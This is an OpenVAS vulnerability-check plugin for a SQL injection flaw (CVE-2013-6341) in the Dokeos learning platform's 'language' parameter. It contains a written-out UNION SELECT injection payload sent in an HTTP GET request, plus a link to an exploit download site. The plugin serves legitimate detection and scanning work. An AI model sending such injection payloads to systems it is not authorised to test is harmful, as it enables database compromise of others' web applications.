###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_dokeos_sql_inj_vuln.nasl 3561 2016-06-20 14:43:26Z benallard $
#
# Dokeos 'language' Parameter SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903415");
  script_version("$Revision: 3561 $");
  script_cve_id("CVE-2013-6341");
  script_bugtraq_id(63461);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-20 16:43:26 +0200 (Mon, 20 Jun 2016) $");
  script_tag(name:"creation_date", value:"2013-11-28 14:52:35 +0530 (Thu, 28 Nov 2013)");
  script_name("Dokeos 'language' Parameter SQL Injection Vulnerability");

  script_tag(name : "summary" , value : "This host is running Dokeos and is prone to SQL injection vulnerability.");
  script_tag(name : "vuldetect" , value : "Send a crafted exploit string via HTTP GET request and check whether it
  is possible to execute sql query.");
  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name : "insight" , value : "The flaw is due to insufficient validation of 'language' HTTP GET parameter
  passed to '/index.php' script.");
  script_tag(name : "affected" , value : "Dokeos versions 2.2 RC2 and probably prior.");
  script_tag(name : "impact" , value : "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands in applications database and gain complete control over the vulnerable
  web application.

  Impact Level: Application");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23181");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/dokeos-22-rc2-sql-injection");
  script_summary("Check if Dokeos is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_copyright("Copyright (C) 2013 SecPod");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
dokPort = "";
req = "";
res = "";
url = "";

## Get HTTP Port
dokPort = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:dokPort)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list_unique("/", "/dokeos", "/portal", cgi_dirs(port:dokPort)))
{

  if(dir == "/") dir = "";

  ## Request for the index.php
  dokReq = http_get(item:string(dir, "/index.php"), port:dokPort);
  dokRes = http_keepalive_send_recv(port:dokPort, data:dokReq);

  ## confirm the Dokeos installation
  if('content="Dokeos"'>< dokRes && "http://www.dokeos.com" >< dokRes)
  {
    ## Construct Attack Request
    url = dir + "/index.php?language=0%27%20UNION%20SELECT%201,2,3," +
                "0x673716C2D696E6A656374696F6E2D74657374,version%28" +
                "%29,6,7,8%20--%202)";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:dokPort, url:url, check_header:TRUE,
       pattern:"sql-injection-test", extra_check:make_list('www.dokeos.com',
       'Dokeos')))
    {
      security_message(port:dokPort);
      exit(0);
    }
  }
}

exit(99);